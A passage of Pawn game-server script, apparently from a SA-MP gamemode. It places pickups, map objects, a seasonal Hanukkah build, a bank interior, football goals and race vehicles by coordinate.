	CreateVehiclePickup(1468.9426,1296.5282,10.9069,world_challenges,vp_nitro); // challenge_nitro
	CreateVehiclePickup(1392.2637,1624.0667,10.3757,world_challenges,vp_repair); // challenge_repair
	CreateVehiclePickup(-75.7835,1564.3094,230.6927,world_stunts,vp_repair); // flycar_repair
	CreateVehiclePickup(-76.6003,1503.2058,228.3221,world_stunts,vp_repair); // flycar_repair
	CreateVehiclePickup(133.3832,1504.2811,228.0428,world_stunts,vp_repair); // flycar_repair
	CreateVehiclePickup(133.4417,1564.0835,230.7029,world_stunts,vp_repair); // flycar_repair
	CreatePickupEx(1240,2,659.7784,-2835.2295,5.8602); // pool_health
	CreatePickupEx(1242,2,659.7046,-2841.7800,5.8605); // pool_armour
	CreatePickupEx(371,2,1970.9216,1423.9138,76.1563); // para
	CreatePickupEx(334,2,2238.8508,2449.2900,11.0372); // policebat
	CreateVehiclePickup(-521.0236,2594.6880,53.4141,world_normal,vp_repair); // repair
	CreatePickupEx(1242,2,1639.4150,1633.4014,10.8203); // ap armour
	CreatePickupEx(1240,2,1649.7090,1648.7185,10.8203); // ap health
	CreatePickupEx(371,2,2845.0129,1006.4805,2263.0571,0,world_parachuting); // pr1 para
	CreatePickupEx(371,2,2852.1941,1011.2508,2263.0571,0,world_parachuting); // pr1 para
	CreatePickupEx(371,2,2850.2185,1004.8140,2263.0571,0,world_parachuting); // pr1 para
	CreatePickupEx(19135,1,-785.2632,617.1237,5.4259); // boats shop sign
	CreateVehiclePickup(-231.5356,113.0888,50.5116,world_normal,vp_replace,519); // vehicle_shamal
	CreateVehiclePickup(-316.5748,-77.4612,1.6521,world_normal,vp_replace,521); // vehicle_fcr
	CreateVehiclePickup(-316.2817,-74.4833,1.6615,world_normal,vp_replace,522); // vehicle_nrg
	CreateVehiclePickup(1497.5894,-2469.6670,23.8553,world_stunts,vp_turbo); // turbo
	CreateVehiclePickup(1835.1429,-2485.7529,36.1643,world_stunts,vp_replace,469); // sparrow
	CreateVehiclePickup(1840.8435,-2485.0818,36.0618,world_stunts,vp_replace,469); // sparrow
	CreateVehiclePickup(1980.1837,-2558.2207,60.9374,world_stunts,vp_repair); // repair
	CreateVehiclePickup(1992.8564,-2431.0017,117.1555,world_stunts,vp_repair); // repair
	CreateVehiclePickup(1996.5504,-2179.3982,78.7616,world_stunts,vp_replace,411); // infernus
	CreateVehiclePickup(2009.7926,-2178.6172,78.7616,world_stunts,vp_replace,411); // infernus
	CreateVehiclePickup(2024.0831,-2178.6919,78.7616,world_stunts,vp_replace,411); // infernus
	CreateVehiclePickup(2000.6525,-2389.3401,78.7616,world_stunts,vp_replace,411); // infernus
	CreateVehiclePickup(2014.8722,-2389.1995,78.7616,world_stunts,vp_replace,411); // infernus
	CreateVehiclePickup(2029.0741,-2388.7388,78.7616,world_stunts,vp_replace,411); // infernus
	CreateVehiclePickup(1869.7946,-2197.1272,54.8579,world_stunts,vp_nitro); // nitro
	CreateVehiclePickup(1876.8151,-2377.0298,49.8563,world_stunts,vp_nitro); // nitro
	// Class Selection
	HandleClassSelectionObjects();
	HandleClassSelectionNPCs();
	// Gamemode Objects
	dbg(11,"6.2");
	CreateSObject(18864,-739.6063,491.9263,1371.9766,0.0,0.0,0.0); // snow LC
	CreateSObject(3749, 808.391174, 842.888123, 14.780720, 0.0000, 0.0000, 292.9640); // sandkings
	CreateSObject(8154, 1383.918701, 756.486328, 12.921340, 0.0000, 0.0000, 179.6226); // sandkings
	CreateSObject(8151, 1388.514038, 702.435425, 14.038527, 0.0000, 0.0000, 180.4820); // sandkings
	CreateSObject(8150, 1397.094360, 736.002380, 12.921340, 0.0000, 0.0000, 90.2408); // sandkings
	CreateSObject(8150, 1397.034058, 725.798828, 12.921341, 0.0000, 0.0000, 90.2408); // sandkings
	CreateSObject(8210, 2236.2271,1657.8861,1008.3594, 0.0000, 0.0000, 180.0000,object_show_distance,-1,-1); // anti gamble
	CreateSObject(8210, 1981.9517,1018.2281,994.4688, 0.0000, 0.0000, 90.0000,object_show_distance,-1,-1); // anti gamble
	shark[sharks++] = CreateSObject(1608,1981.96,1528.24,8.47,0.00,0.00,347.11);
	shark[sharks++] = CreateSObject(1608,1982.37,1548.07,8.47,0.00,0.00,20.69);
	shark[sharks++] = CreateSObject(1608,1978.19,1485.58,8.47,0.00,0.00,223.60);
	shark[sharks++] = CreateSObject(1608,1929.88,1482.28,8.47,0.00,0.00,283.63);
	#if hanukkah_now
	CreateSObject(9829, -2014.25, -2912.94, -59.11,   0.00, 0.00, 271.82);
	CreateSObject(18783, -2038.17, -2996.45, 7.40,   0.00, 0.00, 2.01);
	CreateSObject(18783, -1998.43, -2995.52, 7.34,   0.00, 0.00, 2.10);
	CreateSObject(18786, -2018.70, -2976.37, 7.34,   0.00, 0.00, 90.23);
	CreateSObject(19128, -2007.96, -2966.61, 7.78,   -90.00, 0.00, 5.31);
	CreateSObject(19128, -2004.13, -2966.34, 7.78,   -90.00, 0.00, 3.53);
	CreateSObject(19128, -2000.20, -2966.13, 7.78,   -90.00, 0.00, 3.86);
	CreateSObject(19128, -1996.33, -2965.83, 7.78,   -90.00, 0.00, 4.81);
	CreateSObject(19128, -1992.45, -2965.48, 7.78,   -90.00, 0.00, 4.81);
	CreateSObject(19128, -2046.31, -2968.92, 7.78,   -89.00, 0.00, 0.87);
	CreateSObject(18783, -1999.25, -2976.03, 7.34,   0.00, 0.00, 4.18);
	CreateSObject(18783, -2038.42, -2978.80, 7.34,   0.00, 0.00, 0.86);
	CreateSObject(19129, -2037.62, -3074.00, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19128, -2030.56, -2968.70, 7.78,   -89.00, 0.00, 0.87);
	CreateSObject(19128, -2034.50, -2968.72, 7.78,   -89.00, 0.00, 0.87);
	CreateSObject(19128, -2038.50, -2968.78, 7.78,   -89.00, 0.00, 0.87);
	CreateSObject(19128, -2042.37, -2968.82, 7.78,   -89.00, 0.00, 0.87);
	CreateSObject(1649, -2029.37, -3005.79, 14.64,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2029.25, -3005.71, 17.77,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2029.10, -3005.63, 21.01,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2029.49, -3005.80, 11.38,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2041.48, -3005.57, 11.38,   0.00, 0.00, 1.96);
	CreateSObject(1649, -2041.52, -3005.63, 14.58,   0.00, 0.00, 1.96);
	CreateSObject(1649, -2041.57, -3005.69, 17.89,   0.00, 0.00, 1.96);
	CreateSObject(1649, -2041.62, -3005.75, 21.06,   0.00, 0.00, 1.96);
	CreateSObject(1649, -2037.60, -3005.84, 11.38,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2037.55, -3005.78, 14.64,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2037.50, -3005.71, 17.77,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2037.45, -3005.65, 21.01,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2033.38, -3005.61, 11.38,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2033.39, -3005.68, 14.64,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2033.40, -3005.74, 17.77,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2033.40, -3005.81, 21.01,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2005.84, -3005.68, 11.38,   0.00, 0.00, 1.96);
	CreateSObject(1649, -2005.84, -3005.68, 14.58,   0.00, 0.00, 1.96);
	CreateSObject(1649, -2005.84, -3005.68, 17.89,   0.00, 0.00, 1.96);
	CreateSObject(1649, -2005.84, -3005.68, 21.06,   0.00, 0.00, 1.96);
	CreateSObject(1649, -2001.63, -3005.51, 21.01,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2001.63, -3005.51, 17.77,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2001.63, -3005.51, 14.64,   0.00, 0.00, 2.42);
	CreateSObject(1649, -2001.63, -3005.51, 11.38,   0.00, 0.00, 2.42);
	CreateSObject(1649, -1997.35, -3005.21, 11.38,   0.00, 0.00, 2.42);
	CreateSObject(1649, -1997.31, -3005.21, 14.64,   0.00, 0.00, 2.42);
	CreateSObject(1649, -1997.27, -3005.20, 17.77,   0.00, 0.00, 2.42);
	CreateSObject(1649, -1997.22, -3005.20, 21.01,   0.00, 0.00, 2.42);
	CreateSObject(1649, -1992.87, -3004.95, 21.01,   0.00, 0.00, 2.42);
	CreateSObject(1649, -1992.96, -3004.95, 17.77,   0.00, 0.00, 2.42);
	CreateSObject(1649, -1993.05, -3004.96, 14.64,   0.00, 0.00, 2.42);
	CreateSObject(1649, -1993.13, -3004.97, 11.38,   0.00, 0.00, 2.42);
	CreateSObject(18761, -2017.85, -3005.30, 14.54,   0.00, 0.00, 0.27);
	CreateSObject(19129, -2018.17, -2995.96, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -1977.80, -3074.25, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -2017.81, -3074.50, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -1977.98, -3054.30, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -2037.47, -3054.05, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -2017.66, -3054.91, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -2036.98, -3016.72, 9.76,   0.00, 0.00, 0.75);
	CreateSObject(19129, -2037.66, -3035.65, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -2017.85, -3035.77, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -2017.70, -3015.79, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -1978.33, -3014.79, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -1978.77, -3034.35, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -1998.00, -3035.06, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -1997.86, -3015.50, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -1997.82, -3055.01, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(19129, -1997.95, -3074.97, 9.77,   0.00, 0.00, 0.75);
	CreateSObject(3660, -2037.24, -3003.64, 12.47,   0.00, 0.00, 0.00);
	CreateSObject(3660, -1998.25, -3004.80, 12.47,   0.00, 0.00, 0.00);
	CreateSObject(17026, -2049.21, -2996.81, 4.94,   0.00, 0.00, 155.01);
	CreateSObject(7916, -1986.77, -3018.18, 13.86,   0.00, 0.00, 257.44);
	CreateSObject(7916, -1996.68, -2979.92, 13.86,   0.00, 0.00, 265.26);
	CreateSObject(17026, -2045.12, -3048.88, 6.71,   0.00, 0.00, 140.97);
	CreateSObject(2773, -2026.72, -2997.81, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2026.74, -2999.75, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2026.65, -3001.85, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2026.83, -2995.79, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2026.91, -2993.82, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2026.92, -2991.82, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2008.50, -3002.91, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2027.87, -2986.45, 10.35,   0.00, 0.00, 242.52);
	CreateSObject(2773, -2026.55, -3003.81, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2027.03, -2989.74, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2008.62, -2998.82, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2008.88, -2987.11, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2008.83, -2989.02, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2008.82, -2990.96, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2008.75, -2992.91, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2008.68, -2994.87, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2008.60, -2996.87, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2008.53, -3000.87, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(2773, -2027.09, -2987.89, 10.35,   0.00, 0.00, 1.15);
	CreateSObject(974, -1996.47, -3047.62, 9.90,   0.00, 0.00, 0.54);
	CreateSObject(974, -2008.00, -3047.87, 9.90,   0.00, 0.00, 0.54);
	CreateSObject(974, -2014.52, -3047.94, 9.90,   0.00, 0.00, 0.54);
	CreateSObject(974, -2001.80, -3047.78, 9.90,   0.00, 0.00, 0.54);
	CreateSObject(974, -2020.78, -3048.04, 9.90,   0.00, 0.00, 0.54);
	CreateSObject(974, -2027.25, -3048.14, 9.90,   0.00, 0.00, 0.54);
	CreateSObject(974, -2002.70, -3055.65, 12.78,   -91.00, 0.00, 1.75);
	CreateSObject(974, -1996.54, -3055.58, 12.78,   -91.00, 0.00, 1.73);
	CreateSObject(974, -2020.29, -3055.82, 12.77,   -91.00, 0.00, 0.00);
	CreateSObject(974, -2026.77, -3055.75, 12.77,   -91.00, 0.00, 0.00);
	CreateSObject(974, -2007.32, -3055.79, 12.78,   -91.00, 0.00, 1.73);
	CreateSObject(974, -2013.66, -3055.72, 12.78,   -91.00, 0.00, 1.75);
	CreateSObject(974, -2026.88, -3050.82, 12.71,   -91.00, 0.00, 0.00);
	CreateSObject(974, -2020.40, -3050.83, 12.71,   -91.00, 0.00, 0.00);
	CreateSObject(974, -2013.76, -3050.67, 12.71,   -91.00, 0.00, 1.75);
	CreateSObject(974, -2007.42, -3050.69, 12.71,   -91.00, 0.00, 1.73);
	CreateSObject(974, -1996.63, -3050.42, 12.71,   -91.00, 0.00, 1.73);
	CreateSObject(974, -2002.79, -3050.43, 12.71,   -91.00, 0.00, 1.75);
	CreateSObject(16088, -2017.22, -3058.06, 12.95,   0.00, 0.00, 270.09);
	CreateSObject(16088, -2002.10, -3058.07, 13.06,   0.00, 0.00, 270.09);
	CreateSObject(2229, -2029.97, -3048.71, 12.53,   0.00, 0.00, 215.08);
	CreateSObject(3850, -1997.39, -3042.14, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -2030.44, -3046.40, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -2030.38, -3042.96, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -2030.45, -3039.53, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -2030.49, -3036.13, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -1997.23, -3045.30, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -2030.47, -3029.28, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -2030.48, -3032.71, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -1997.11, -3038.72, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -1997.03, -3035.43, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(3850, -1996.82, -3028.71, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(17026, -1984.52, -2985.01, 5.55,   0.00, 0.00, 338.21);
	CreateSObject(17026, -1972.87, -3036.49, 6.71,   0.00, 0.00, 338.21);
	CreateSObject(17026, -1985.98, -3075.99, 6.71,   0.00, 0.00, 257.30);
	CreateSObject(17026, -2022.41, -3080.46, 6.71,   0.00, 0.00, 257.30);
	CreateSObject(17026, -2045.36, -3066.91, 6.71,   0.00, 0.00, 140.97);
	CreateSObject(7916, -2035.22, -2992.09, 13.86,   0.00, 0.00, 82.53);
	CreateSObject(7916, -2036.80, -3056.71, 13.86,   0.00, 0.00, 82.53);
	CreateSObject(7916, -1998.70, -3064.56, 13.86,   0.00, 0.00, 171.65);
	CreateSObject(18102, -2029.41, -3025.92, 20.12,   -50.00, 0.00, 96.81);
	CreateSObject(18102, -1997.96, -3034.46, 20.12,   -50.00, 0.00, 293.99);
	CreateSObject(18653, -2028.04, -3043.09, 9.97,   0.00, 0.00, 213.72);
	CreateSObject(18653, -1998.89, -3046.27, 9.97,   0.00, 0.00, 0.00);
	CreateSObject(18653, -1998.98, -3044.07, 9.97,   0.00, 0.00, 0.00);
	CreateSObject(18653, -2028.59, -3045.96, 9.97,   0.00, 0.00, 213.72);
	CreateSObject(16151, -2011.52, -3046.67, 10.10,   0.00, 0.00, 270.03);
	CreateSObject(16151, -2021.11, -3046.99, 10.21,   0.00, 0.00, 270.03);
	CreateSObject(3472, -2029.07, -2981.51, 9.83,   0.00, 0.00, 0.00);
	CreateSObject(3472, -2030.19, -2969.03, 9.83,   0.00, 0.00, 0.00);
	CreateSObject(18092, -2003.75, -3048.38, 13.18,   0.00, 0.00, 0.00);
	CreateSObject(18092, -2019.75, -3049.03, 12.97,   0.00, 0.00, 0.00);
	CreateSObject(14820, -2019.83, -3048.66, 13.47,   0.00, 0.00, 0.00);
	CreateSObject(14820, -2004.45, -3048.13, 13.73,   0.00, 0.00, 0.00);
	CreateSObject(14582, -2030.59, -3015.23, 13.17,   0.00, 0.00, 0.00);
	CreateSObject(14582, -2005.35, -3013.32, 13.17,   0.00, 0.00, 0.00);
	CreateSObject(14637, -2020.40, -3049.32, 14.38,   0.00, 0.00, 86.02);
	CreateSObject(2232, -2023.91, -3048.41, 13.24,   0.00, 0.00, 184.04);
	CreateSObject(2232, -2022.72, -3048.47, 13.24,   0.00, 0.00, 184.04);
	CreateSObject(2229, -2009.22, -3048.88, 12.69,   0.00, 0.00, 175.59);
	CreateSObject(2229, -2011.33, -3048.70, 12.69,   0.00, 0.00, 175.59);
	CreateSObject(2229, -2012.98, -3048.84, 12.69,   0.00, 0.00, 175.59);
	CreateSObject(3472, -2009.34, -2969.63, 9.83,   0.00, 0.00, 0.00);
	CreateSObject(3472, -2008.02, -2982.11, 9.83,   0.00, 0.00, 0.00);
	CreateSObject(7392, -2007.49, -2996.07, 17.69,   0.00, 0.00, 0.00);
	CreateSObject(7392, -2028.49, -2996.30, 17.69,   0.00, 0.00, 0.00);
	CreateSObject(19336, -2039.29, -2969.84, 9.89,   0.00, 0.00, 0.00);
	CreateSObject(19335, -1997.39, -2967.10, 9.89,   0.00, 0.00, 2.07);
	CreateSObject(3437, -1974.10, -2963.57, 22.55,   2.00, -358.00, 270.00);
	CreateSObject(3437, -1974.20, -2937.72, 25.18,   0.00, 0.00, 271.06);
	CreateSObject(3437, -1974.00, -2938.43, 17.19,   2.00, -89.00, 270.00);
	CreateSObject(3437, -1973.99, -2948.90, 17.08,   2.00, -89.00, 270.00);
	CreateSObject(3437, -1973.96, -2958.55, 16.98,   2.00, -89.00, 270.00);
	CreateSObject(3437, -1974.03, -2927.35, 17.39,   2.00, -89.00, 270.00);
	CreateSObject(3437, -1973.72, -2916.03, 17.59,   2.00, -89.00, 270.00);
	CreateSObject(3437, -1973.97, -2911.46, 22.55,   2.00, -358.00, 270.00);
	CreateSObject(3437, -1974.05, -2918.84, 22.55,   2.00, -358.00, 270.00);
	CreateSObject(13646, -1973.52, -2937.86, 6.65,   0.00, 0.00, 0.21);
	CreateSObject(3437, -1973.86, -2938.10, 10.76,   0.00, 0.00, 271.06);
	CreateSObject(3437, -1974.17, -2926.94, 22.55,   2.00, -358.00, 270.00);
	CreateSObject(3437, -1974.24, -2944.39, 22.55,   2.00, -358.00, 270.00);
	CreateSObject(3437, -1974.31, -2955.02, 22.55,   2.00, -358.00, 270.00);
	CreateSObject(13646, -1973.52, -2937.86, 18.85,   0.00, 0.00, 0.21);
	CreateSObject(3528, -1975.96, -2937.76, 15.55,   0.00, 0.00, 177.37);
	CreateSObject(3437, -2051.12, -2947.08, 17.20,   2.00, -90.00, 92.00);
	CreateSObject(3437, -2050.17, -2954.63, 11.70,   0.00, 0.00, 91.78);
	CreateSObject(3437, -2049.38, -2961.34, 8.22,   0.00, 0.00, 91.78);
	CreateSObject(3437, -2050.91, -2947.22, 6.97,   -2.00, -90.00, 92.00);
	CreateSObject(3437, -2051.22, -2942.18, 11.70,   0.00, 0.00, 91.78);
	CreateSObject(3437, -2051.39, -2938.52, 11.70,   0.00, 0.00, 91.78);
	CreateSObject(3437, -2052.84, -2925.59, 11.70,   0.00, 0.00, 91.78);
	CreateSObject(3437, -2052.57, -2930.42, 6.97,   -2.00, -90.00, 92.00);
	CreateSObject(3437, -2050.23, -2959.00, 17.20,   2.00, -90.00, 92.00);
	CreateSObject(3437, -2053.39, -2915.72, 17.20,   2.00, -90.00, 92.00);
	CreateSObject(3437, -2053.44, -2910.82, 11.70,   0.00, 0.00, 91.78);
	CreateSObject(3437, -2053.00, -2920.48, 11.70,   0.00, 0.00, 91.78);
	CreateSObject(3515, -2010.18, -2969.30, 6.58,   -360.00, -302.00, 183.58);
	CreateSObject(3515, -2028.15, -2969.23, 6.58,   -360.00, -302.00, -360.00);
	CreateSObject(3850, -1996.91, -3032.10, 10.48,   0.00, 0.00, 0.00);
	CreateSObject(10244, -1992.21, -3055.41, 9.20,   0.00, 0.00, 91.29);
	CreateSObject(3437, -1973.70, -2906.04, 17.59,   2.00, -89.00, 270.00);
	CreateSObject(3437, -1973.66, -2901.72, 22.55,   2.00, -358.00, 270.00);
	CreateSObject(3437, -1973.87, -2966.99, 16.98,   2.00, -89.00, 270.00);
	CreateSObject(3437, -1974.14, -2971.79, 22.55,   2.00, -358.00, 270.00);
	#endif
	// New Bank
	dbg(11,"6.3");
	CreateSObject(14785, 285.75, -1611.0300292969, 115.41999816895, 0, 0, 350, object_show_distance, 6, world_bank);
	CreateSObject(985, 279.7200012207, -1611.4000244141, 113.73999786377, 0, 0, 80, object_show_distance, 6, world_bank);
	CreateSObject(985, 278.35998535156, -1619.1600341797, 113.73999786377, 0, 0, 79.996948242188, object_show_distance, 6, world_bank);
	CreateSObject(2773, 282.26000976563, -1616.5300292969, 113.9700012207, 0, 0, 352, object_show_distance, 6, world_bank);
	CreateSObject(2773, 283.70001220703, -1608.2099609375, 113.9700012207, 0, 0, 351.99645996094, object_show_distance, 6, world_bank);
	CreateSObject(2773, 284.08999633789, -1611.5899658203, 113.98000335693, 0, 0, 261.99645996094, object_show_distance, 6, world_bank);
	CreateSObject(2773, 283.76998901367, -1613.3699951172, 113.9700012207, 0, 0, 261.99096679688, object_show_distance, 6, world_bank);
	CreateSObject(2775, 292.79000854492, -1615.3199462891, 116.38999938965, 0, 0, 260, object_show_distance, 6, world_bank);
	//CreateSObject(1274, 283.95999145508, -1607.3299560547, 115.04000091553, 0, 0, 80, object_show_distance, 6, world_bank);
	CreateSObject(1550, 279.58999633789, -1606.6600341797, 113.86000061035, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1550, 279.73001098633, -1606.0500488281, 113.86000061035, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1550, 279.85000610352, -1605.4699707031, 113.86000061035, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1550, 280.39001464844, -1605.5999755859, 113.86000061035, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1550, 280.23999023438, -1606.1500244141, 113.86000061035, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1550, 280.08999633789, -1606.7600097656, 113.86000061035, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1550, 280.05999755859, -1606.4599609375, 114.58000183105, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1550, 280.23999023438, -1605.8299560547, 114.58000183105, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1550, 280.20999145508, -1606.1099853516, 115.20999908447, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.80999755859, -1606.6999511719, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.89001464844, -1606.4499511719, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.80999755859, -1606.2800292969, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.61999511719, -1606.4499511719, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.54998779297, -1606.7099609375, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.92001342773, -1606.8699951172, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 281.07000732422, -1606.5600585938, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.91000366211, -1606.1099853516, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.66000366211, -1605.9799804688, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.58999633789, -1606.2099609375, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 280.82998657227, -1605.8399658203, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 281.08999633789, -1606.0100097656, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(1212, 281.14999389648, -1606.2700195313, 113.4700012207, 0, 0, 0, object_show_distance, 6, world_bank);
	CreateSObject(14608, 277.7200012207, -1601.5600585938, 115.05999755859, 0, 0, 280, object_show_distance, 6, world_bank);
	CreateSObject(14608, 281.04000854492, -1600.1400146484, 115.05999755859, 0, 0, 229.99755859375, object_show_distance, 6, world_bank);
	CreateSObject(14608, 283.75, -1601.1800537109, 115.05999755859, 0, 0, 189.99328613281, object_show_distance, 6, world_bank);
	CreateSObject(1558, 283.26000976563, -1606.8299560547, 113.98999786377, 0, 0, 350, object_show_distance, 6, world_bank);
	CreateSObject(1558, 282.2200012207, -1606.6700439453, 113.98999786377, 0, 0, 349.99694824219, object_show_distance, 6, world_bank);
	CreateSObject(1558, 282.7200012207, -1606.7399902344, 114.98999786377, 0, 0, 349.99694824219, object_show_distance, 6, world_bank);
	CreateSObject(2922, 284.04998779297, -1606.7700195313, 114.63999938965, 0, 0, 260, object_show_distance, 6, world_bank);
	// Football Objects
	sportobj[0] = CreateSObject(11480,1384.099365,2131.209229,12.209333,0.0000,0.0000,270.0000,object_show_distance,0,world_sport);
	sportobj[1] = CreateSObject(11319,1387.203491,2131.288330,9.496674,0.0000,179.5181,0.0000,object_show_distance,0,world_sport);
	sportobj[2] = CreateSObject(11480,1312.078613,2131.202637,12.209337,0.0000,0.0000,270.0000,object_show_distance,0,world_sport);
	sportobj[3] = CreateSObject(11319,1309.019287,2131.260254,9.679480,0.0000,179.5181,0.0000,object_show_distance,0,world_sport);
	// SRace Vehicles
	CreateVehicleEx(510,311.6603,-1787.3307,4.1855,184.2964,2,2,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(510,315.1136,-1787.5203,4.2434,181.1543,2,2,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(510,318.2777,-1787.3186,4.2954,181.3976,2,2,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(510,321.4916,-1787.9641,4.3434,176.6762,2,2,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(510,324.6740,-1787.6819,4.3952,177.2704,2,2,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(481,311.6833,-1810.8069,3.9625,357.2803,46,46,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(481,314.9236,-1810.7081,3.9632,358.4378,46,46,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(481,317.9956,-1810.9086,3.9618,0.4975,46,46,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(481,321.1752,-1810.8948,3.9659,1.0386,46,46,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(481,324.3205,-1810.7952,3.9691,359.3727,46,46,respawntime,0,world_srace); // newsrace_bikev
	CreateVehicleEx(473,716.6423,-1806.3113,-0.3303,0.4760,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(473,716.6017,-1794.1730,-0.2187,359.7165,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(473,716.6290,-1787.0615,-0.3286,359.3929,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(473,716.7306,-1777.4911,-0.1653,359.6479,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(473,716.7756,-1766.9430,-0.1791,0.0911,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(473,734.2734,-1805.5748,-0.2216,359.7620,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(473,734.2518,-1795.6455,-0.3679,359.9576,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(473,734.3395,-1780.0441,-0.1685,359.6531,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(473,734.2841,-1769.2354,-0.1069,1.1857,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(473,734.0787,-1759.0339,-0.2785,1.4932,56,53,respawntime,0,world_srace); // dingh
	CreateVehicleEx(502,752.4333,-1410.5966,13.3410,87.8746,36,88,respawntime,0,world_srace); // newsracev
	CreateVehicleEx(502,740.4918,-1410.5978,13.3355,90.3790,36,88,respawntime,0,world_srace); // newsracev
	CreateVehicleEx(502,729.8682,-1410.6456,13.3381,90.3627,36,88,respawntime,0,world_srace); // newsracev
	CreateVehicleEx(502,719.8849,-1410.6848,13.3355,90.3234,36,88,respawntime,0,world_srace); // newsracev
	CreateVehicleEx(502,709.7360,-1410.7781,13.3498,90.6972,36,88,respawntime,0,world_srace); // newsracev
